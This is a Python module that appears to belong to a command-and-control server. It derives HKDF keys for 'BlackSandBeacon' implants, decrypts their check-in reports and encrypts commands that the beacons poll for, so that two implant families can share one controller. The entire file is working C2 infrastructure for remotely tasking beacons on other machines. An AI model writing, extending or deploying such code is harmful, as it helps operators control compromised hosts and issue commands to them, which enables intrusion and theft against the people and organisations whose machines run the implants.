"""BlackSandBeacon wire-protocol compatibility helpers.

BlackSandBeacon beacons derive their working AES key from the raw C2 key
material with HKDF-SHA256 (salt ``blacksandbeacon-v2``, info ``enc`` /
``hmac``), so their traffic never uses the on-disk key directly. Every
beacon report also carries a replay-protection envelope: the plaintext is
``counter (8 bytes LE) || timestamp (8 bytes LE) || payload``.

The C2 speaks the legacy protocol (raw key, no envelope) for its own
beacons, so these helpers derive the matching BSB keys from the same
on-disk key file and decode the envelope. Result handling tries the
legacy format first and falls back to BSB, so both client families check
in against the same C2.

Contracts:
    - ``derive_bsb_keys``: HKDF-SHA256 key separation matching BSB's C code.
    - ``decrypt_bsb_report``: decode one BSB report (b64 IV + ciphertext).
    - ``encrypt_bsb_command``: legacy wire format under the BSB-derived key.
"""

from __future__ import annotations

import base64
import json
import logging
import os
import time

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

log = logging.getLogger("bsb_compat")

HKDF_SALT = b"blacksandbeacon-v2"
HKDF_INFO_ENC = b"enc"
HKDF_INFO_HMAC = b"hmac"
REPLAY_HEADER_BYTES = 16  # counter (8 LE) + timestamp (8 LE)
TIMESTAMP_FUTURE_SLACK_S = 60
DEFAULT_REPLAY_WINDOW_S = 300

_key_cache: dict[str, bytes] = {"source": b"", "enc": b"", "hmac": b""}


def derive_bsb_keys(master_key: bytes) -> tuple[bytes, bytes]:
    """Derive the BSB encryption and HMAC keys from the raw C2 key.

    Args:
        master_key: Raw 32-byte key material (the ``sessions/key.aes``
            contents beacons were configured with).

    Returns:
        ``(encryption_key, hmac_key)``, both 32 bytes. Derived values are
        cached and recomputed only when the source key rotates.

    Raises:
        ValueError: Key material is not exactly 32 bytes.
    """
    if not isinstance(master_key, (bytes, bytearray)) or len(master_key) != 32:
        raise ValueError("BSB master key must be 32 bytes")
    master_key = bytes(master_key)
    if _key_cache["source"] == master_key:
        return _key_cache["enc"], _key_cache["hmac"]
    enc = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=HKDF_SALT,
        info=HKDF_INFO_ENC,
        backend=default_backend(),
    ).derive(master_key)
    mac = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=HKDF_SALT,
        info=HKDF_INFO_HMAC,
        backend=default_backend(),
    ).derive(master_key)
    _key_cache.update(source=master_key, enc=enc, hmac=mac)
    log.debug("[bsb_compat] HKDF keys derived")
    return enc, mac


def decrypt_bsb_report(
    encrypted_data: bytes | str,
    master_key: bytes,
    replay_window_seconds: int = DEFAULT_REPLAY_WINDOW_S,
) -> tuple[dict, int, int]:
    """Decrypt and decode one BSB report.

    Args:
        encrypted_data: Base64 text (or bytes of it) as sent by the
            beacon: ``b64(IV || AES-256-CFB ciphertext)``.
        master_key: Raw 32-byte C2 key material.
        replay_window_seconds: Accepted past timestamp window.

    Returns:
        ``(payload_dict, counter, timestamp)`` on success.

    Raises:
        ValueError: Malformed base64, decryption failure, replay envelope
            out of bounds, or the payload is not valid JSON.
    """
    enc_key, _ = derive_bsb_keys(master_key)
    if isinstance(encrypted_data, str):
        encrypted_data = encrypted_data.encode("ascii", "ignore")
    raw = base64.b64decode(encrypted_data, validate=False)
    if len(raw) <= 16:
        raise ValueError("BSB payload shorter than IV + envelope")
    iv, ciphertext = raw[:16], raw[16:]
    decryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend()).decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    if len(plaintext) <= REPLAY_HEADER_BYTES:
        raise ValueError("BSB payload missing replay envelope")
    counter = int.from_bytes(plaintext[:8], "little")
    timestamp = int.from_bytes(plaintext[8:REPLAY_HEADER_BYTES], "little")
    now = int(time.time())
    if counter <= 0:
        raise ValueError(f"BSB counter invalid: {counter}")
    if timestamp > now + TIMESTAMP_FUTURE_SLACK_S:
        raise ValueError(f"BSB timestamp in future: {timestamp} > {now + TIMESTAMP_FUTURE_SLACK_S}")
    if timestamp < now - replay_window_seconds:
        raise ValueError(f"BSB timestamp too old: {timestamp} < {now - replay_window_seconds}")
    try:
        payload = json.loads(plaintext[REPLAY_HEADER_BYTES:])
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"BSB payload is not JSON: {exc}") from exc
    if not isinstance(payload, dict):
        raise ValueError("BSB payload is not a JSON object")
    return payload, counter, timestamp


def encrypt_bsb_command(data: bytes, master_key: bytes) -> str:
    """Encrypt one command for a BSB beacon in the legacy wire format.

    BSB beacons poll with ``GET /command/<id>`` and decrypt the response
    body as ``b64(IV || ciphertext)`` under their HKDF-derived encryption
    key, so the C2 must produce exactly that under the same key.

    Args:
        data: Command text (empty bytes allowed).
        master_key: Raw 32-byte C2 key material.

    Returns:
        Base64 string of ``IV || ciphertext`` ready as the response body.
    """
    enc_key, _ = derive_bsb_keys(master_key)
    if not data:
        data = b"\x00"
    iv_bytes = os.urandom(16)
    encryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv_bytes), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return base64.b64encode(iv_bytes + ciphertext).decode("utf-8")


__all__ = [
    "derive_bsb_keys",
    "decrypt_bsb_report",
    "encrypt_bsb_command",
    "HKDF_SALT",
    "REPLAY_HEADER_BYTES",
]
